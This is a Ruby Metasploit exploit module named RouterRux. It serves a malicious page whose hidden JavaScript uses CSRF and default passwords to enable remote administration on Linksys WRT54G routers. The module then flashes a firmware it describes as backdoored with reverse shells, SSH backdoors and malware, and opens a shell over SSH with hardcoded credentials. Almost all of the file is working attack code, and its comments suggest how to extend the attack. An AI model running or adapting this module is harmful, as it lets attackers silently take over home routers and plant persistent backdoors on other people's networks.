##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'net/ssh'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Auxiliary::CommandShell

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'RouterRux',
			'Description'    => %q{
					This is a hastily assembled proof of concept to illustrate the concept of flashing malicious firmware
				to soho routers.  This module attempts to serve a page which enables remote administration
				on WRT54G v1-4 routers via csrf.  It then flashes them with a custom backdoored firmware
				wish reverse shell, ssh backdoors, and malware binaries.  RouterRux could easily post firmware directly in cases
				where that is allowed, as well as use any other router vulnerabilities to gain admin access.         
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'tdz <tdzmont[at]gmail.com>'
				],
			'References'     =>
				[
					[ 'URL', 'http://' ],
				],
			'DefaultOptions'  =>
				{
					'ExitFunction' => "none"
				},
			'Payload'        =>
				{
					'Compat' => {
						'PayloadType'    => 'cmd_interact',
						'ConnectionType' => 'find'
					}
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        =>
				[
					['WRT', {}],
				],
			'Privileged'     => true,
			'DisclosureDate' => "Oct 27 2015",
			'DefaultTarget'  => 0))
			
			register_options(
			[
				OptInt.new('MGMT_PORT', [ false, 'The port to enable remote management', 8080]),
			], self.class
			)

			register_advanced_options(
			[
				OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
				OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 15])
				
			]
			)
	end

	def passwords
		passwords = ["password"]
	end



	def detect_wrt54g(rhost, user, pass)
		uri = "/Status_Router.asp"
		cli = Rex::Proto::Http::Client.new(rhost,datastore['MGMT_PORT'])
		cli.connect
		auth_str = Rex::Text.encode_base64("#{user}:#{pass}")
		auth = "Basic #{auth_str}"
		req = cli.request_cgi({'uri'=> uri,'authorization' => auth})
		print_status("Request sent...");
		res = cli.send_recv(req)
		cli.close
		if res.nil?
			print_error("Failed reading router!")
			return nil, nil
		end
		if(res.code == 401)
			print_error("Incorrect user and pass!")
			return nil, nil
		end
		# Extract banner from response
		header_server = res.headers['Server']
		print_status("Fingerprint Server: #{header_server}")
		# Extract version from body #v2.02.7
		version = nil
		version_str = res.body.match(/>WRT54G<.*v(\d)\.\d+\.\d+/m)
		version = Regexp.last_match(1)
		if not version.nil?
				return true,version
		end
		return nil,nil
	end

	def upload_wrt54g(rhost,firmware,user,pass)
		uri = "/upgrade.cgi"
		cli = Rex::Proto::Http::Client.new(rhost,datastore['MGMT_PORT'])
		cli.connect
		data = Rex::MIME::Message.new
		data.bound = "---------------------------7df26f121b105da"  	
		data.add_part("Upgrade", nil, nil, 'form-data; name="submit_button"')
		data.add_part("\r\n", nil, nil, 'form-data; name="change_action"')
		data.add_part("\r\n", nil, nil, 'form-data; name="action"')
		data.add_part("", nil, nil, 'form-data; name="process"')
		data_post = data.to_s
		#add the firmware binary 
		data_post = data_post[0..data_post.length-data.bound.length-7]
		data_post << "\r\n--#{data.bound}"
		data_post << "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"openwrt.bin\"\r\n"
		data_post << "Content-Type: application/octet-stream\r\n\r\n"
		data_post << firmware
		data_post << "\r\n--#{data.bound}--\r\n\r\n"
		data_post = data_post.gsub(/^\r\n\-\-\-\-/, '----')
		auth_str = Rex::Text.encode_base64("#{user}:#{pass}")
		auth = "Basic #{auth_str}"
		
		req = cli.request_cgi({
			'method'  => 'POST',
			'uri'     => uri,
			'authorization' => auth,
			'ctype'   => "multipart/form-data; boundary=#{data.bound}",
			'headers' => {"Referer" => "http://192.168.0.1/Upgrade.asp","Accept-Encoding" => "gzip, deflate", "Connection" => "Keep-Alive",
									"Accept" => "text/html, application/xhtml+xml, */*","Accept-Language" => "en-US"},
			'data'    => data_post
		})
		res = cli.send_recv(req)
		print_status("Request recv");
		cli.close
	end
	 
	
	
	def fingerprint(rhost)
		rtype = nil
		#check for wrt54g
		passwords.each do |pass| 
			print_status("Trying wrt54g with admin #{pass}")
			wrt54g,version = detect_wrt54g(rhost, "admin", pass) 
			if (wrt54g)
				rtype="wrt54g"
				print_status("Found Router: #{rtype} #{version}")
				if (version.to_i < 5)
					return rtype,pass
				else 
					return nil,nil
				end
			end
		end
		return nil,nil
	end
	
	def on_request_uri(cli, request)
		#would want to enumerate users also, but admin is fine for poc
		user = "admin"
		
		print_status("Request from: #{cli.peerhost}")
		ip=cli.peerhost
		print_status("Sending page to enable remote mgmt")
		# Build out the message
		content = %Q|
				<html>
				<body onload="go();">
				This could say anything, or be blank, or whatever.
				<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
				<script language="javascript">
				//this is all clearly pulled from the dns changing ek
				var ips = ["192.168.1.1","192.168.0.1"]
				var passwords=["password","<eopl>"];
				var pstp=50;
				var gstp=10000;
				function sendrequest(zurl, data, method){
					if(method=="GET"){
					zurl=zurl+"?"+data;
					document.write('<style type="text/css">@import url('+zurl+'&ju='+ Math.random()+');</style>');
					if(zurl.indexOf('<eopl>')>0){var tm=setTimeout(function(){window.stop();},gstp);}
					}
					else{
						document.write('<body></body>');
						var ifrm = document.createElement('IFRAME');
						ifrm.height="1px";
						ifrm.width="1px";
						document.body.appendChild(ifrm);
						var f=ifrm.contentWindow.document.createElement('FORM');
						f.name='f';
						f.method=method;
						f.action=zurl;
						var el=data.split('&');
						for(i=0;i<el.length;i++)
						{
							var e=el[i].split('=');
							var t=ifrm.contentWindow.document.createElement('INPUT');
							t.type='TEXT';
							t.id=e[0];
							t.name=e[0];
							t.value=e[1];
							f.appendChild(t);
						}
						ifrm.contentWindow.document.body.appendChild(f);
						f.submit();
						var tm=setTimeout(function(){window.stop();},pstp);
					}
				}
				function go()
				{ 
					//in a non poc we would use a stun js library, or at least enumerate common ip addresses.
					//we would also try multiple urls as in the dns changing exploit kit
					var method = "GET";
					var data="submit_button=Management&change_action=&action=Apply&PasswdModify=0&remote_mgt_https=0&remote_management=1&http_wanport=8080&upnp_enable=1";
					//sendrequest("http://192.168.1.1/apply.cgi", data, method);
					for (i = 0; i < passwords.length; i++) {
						console.log("testing " + passwords[i]);
						zurl = "http://admin:"+passwords[i]+"@192.168.1.1/apply.cgi";
						sendrequest(zurl, data, method);
					}
				}
				</script>
				<A HREF="javascript:void(0)">Some Social Engineering Junk or just nothing</A>
		|
		# Send requests enabling remote admin.
		send_response_html(cli, content)
			
		print_status("Waiting...")
		sleep(5)
		print_status("Attempting fingerprint")
 
		rtype = nil
		pass = nil
		rtype,pass = fingerprint(ip)
		
		if not rtype.nil?
			print_status("Found a #{rtype}")
			#upload firmware
			print_status("Sending firmware.")
			firmpath = nil
			if (rtype == "wrt54g")
				firmpath = File.join( Msf::Config.data_directory, "exploits","routerrux","openwrt-wrt54g.bin")
				fd = File.open( firmpath, "rb" )
				@firmware  = fd.read(fd.stat.size)		
				fd.close
				upload_wrt54g(ip,@firmware,user,pass)
			end
		end
		print_status("Sleeping for flash")
		sleep(120)
		
		conn = nil
		for i in 0..10
			if not conn.nil? then
				break
			end
			conn = do_login(ip, "linksys", "admin")

			if conn
				print_good("#{ip} - Login Successful with linksys/admin")
				handler(conn.lsock)
			end
			sleep(10)
		end
	end

	def do_login(ip, user, pass)
		print_status("Attempting SSH")
		opts = {
			:auth_methods => ['password', 'keyboard-interactive'],
			:msframework  => framework,
			:msfmodule    => self,
			:port         => 22,
			:disable_agent => true,
			:config => true,
			:password => pass,
			:record_auth_info => true,
			:proxies => datastore['Proxies']
		}
		opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
		begin
			ssh = nil
			::Timeout.timeout(datastore['SSH_TIMEOUT']) do
				ssh = Net::SSH.start(ip, user, opts)
			end
		rescue Rex::ConnectionError
			return nil
		rescue Net::SSH::Disconnect, ::EOFError
			print_error "#{ip}:#{port} SSH - Disconnected during negotiation"
			return nil
		rescue ::Timeout::Error
			print_error "#{ip}:#{port} SSH - Timed out during negotiation"
			return nil
		rescue Net::SSH::AuthenticationFailed
			print_error "#{ip}:#{port} SSH - Failed authentication"
			return nil
		rescue Net::SSH::Exception => e
			print_error "#{ip}:#{port} SSH Error: #{e.class} : #{e.message}"
			return nil
		end

		if ssh
			conn = Net::SSH::CommandStream.new(ssh, '/bin/sh', true)
			return conn
		end

		return nil
	end



end
